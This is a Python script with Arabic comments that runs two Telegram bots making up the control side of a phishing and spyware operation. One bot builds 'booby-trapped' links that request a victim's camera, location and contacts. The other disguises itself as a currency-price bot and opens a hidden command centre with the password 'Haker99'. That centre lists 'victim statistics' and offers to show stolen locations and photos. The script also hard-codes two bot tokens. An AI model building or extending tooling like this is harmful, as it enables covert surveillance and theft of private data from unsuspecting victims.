import telebot
from telebot import types

# --- إعداد التوكينات التي قدمتها ---
TOKEN_MINING = "8531458352:AAGJ6xcsX6m9uJD3kPymA6GYcv1G2HBXByE"
TOKEN_MASTER = "8524839627:AAGtMcBdA4Z95OQWbhpSoY4q2DQrwKYnf-g"

bot_mining = telebot.TeleBot(TOKEN_MINING)
bot_master = telebot.TeleBot(TOKEN_MASTER)

# تخزين الخيارات لكل مستخدم (بوت التلغيم)
user_selections = {}

# ---------------------------------------------------------
# 1. منطق بوت التلغيم (الصياد)
# ---------------------------------------------------------

@bot_mining.message_handler(commands=['start'])
def start_mining(message):
    user_id = message.chat.id
    if user_id not in user_selections:
        user_selections[user_id] = []
    
    markup = types.InlineKeyboardMarkup()
    options = [("📸 كاميرا", "opt_cam"), ("📍 موقع", "opt_gps"), ("📞 جهات", "opt_contacts")]
    for text, data in options:
        status = "✅ " if data in user_selections[user_id] else ""
        markup.add(types.InlineKeyboardButton(f"{status}{text}", callback_data=data))
    
    markup.add(types.InlineKeyboardButton("🚀 إنشاء الرابط", callback_data="generate"))
    bot_mining.send_message(user_id, "🛠 حدد صلاحيات اللغم:", reply_markup=markup)

@bot_mining.callback_query_handler(func=lambda call: True)
def handle_mining_callback(call):
    user_id = call.from_user.id
    if call.data == "generate":
        link = f"https://your-hosting.com/trap?id={user_id}"
        bot_mining.edit_message_text(f"🔗 الرابط الملغم جاهز:\n`{link}`", user_id, call.message.message_id, parse_mode="Markdown")
        
        # إشعار فوري لبوت الأُم عن إنشاء رابط جديد
        bot_master.send_message(user_id, f"🚩 تنبيه: المستخدم {user_id} قام بتوليد رابط ملغم جديد.")
    else:
        if call.data in user_selections[user_id]:
            user_selections[user_id].remove(call.data)
        else:
            user_selections[user_id].append(call.data)
        # تحديث القائمة (إعادة استدعاء start_mining بشكل غير مباشر)
        start_mining(call.message)

# ---------------------------------------------------------
# 2. منطق بوت الأُم (مركز القيادة)
# ---------------------------------------------------------

@bot_master.message_handler(commands=['help'])
def master_fake_help(message):
    # المساعدة التافهة (التمويه)
    bot_master.reply_to(message, "مرحباً بك في بوت أسعار العملات. استخدم /price لمعرفة السعر الحالي.")

@bot_master.message_handler(func=lambda message: message.text == "Haker99")
def master_real_menu(message):
    # الدخول لمركز القيادة السري
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add("📊 إحصائيات الضحايا", "🔄 نقل ضحية")
    markup.add("📡 حالة البوتات", "🛡 إعدادات الترا")
    bot_master.send_message(message.chat.id, "🔓 تم تفعيل مركز القيادة السري. بانتظار أوامرك...", reply_markup=markup)

@bot_master.message_handler(func=lambda message: message.text == "📊 إحصائيات الضحايا")
def show_stats(message):
    # بروتوكول التأكيد الذكي
    bot_master.send_message(message.chat.id, 
        "سوف أقوم بـ [استرجاع بيانات الضحايا من قاعدة البيانات]، مما يؤدي إلى [عرض المواقع والصور المسحوبة]. هل أنت متأكد؟")

# ---------------------------------------------------------
# تشغيل المنظومة
# ---------------------------------------------------------

import threading

def run_mining(): bot_mining.polling(none_stop=True)
def run_master(): bot_master.polling(none_stop=True)

if __name__ == "__main__":
    print("🚀 المنظومة تعمل الآن تحت إشراف بوت الأُم...")
    threading.Thread(target=run_mining).start()
    threading.Thread(target=run_master).start()
